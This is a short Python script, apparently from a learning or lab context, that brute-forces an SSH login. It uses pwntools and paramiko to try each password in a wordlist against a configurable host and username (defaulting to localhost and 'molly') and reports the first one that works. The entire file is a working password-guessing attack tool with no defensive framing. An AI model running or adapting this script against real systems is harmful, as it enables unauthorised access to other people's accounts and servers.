#ssh brute force

from pwn import *
import paramiko

# Change these two
host = '127.0.0.1'
username = 'molly'

attempts = 0

# open and read wordlist and remove the newline.
with open('wordlist.txt', 'r') as password_list:
	for password in password_list:
		password = password.strip('\n')
		try:
			print('[{}] Attempting password: "{}"!'.format(attempts, password)) 
			# Credentials are used to make an attempted connection...
			response = ssh(host=host, user=username, password=password, timeout=5)
			if response.connected():
				print('[>] Valid password found: "{}"!'.format(password))
				response.close()
				break
			# Close the connection once a valid password is found.
			response.close()
		# If a password is invalid, try another password in the wordlist.
		except paramiko.ssh_exception.AuthenticationException:
			print('[X] Invaild Password!')
		attempts += 1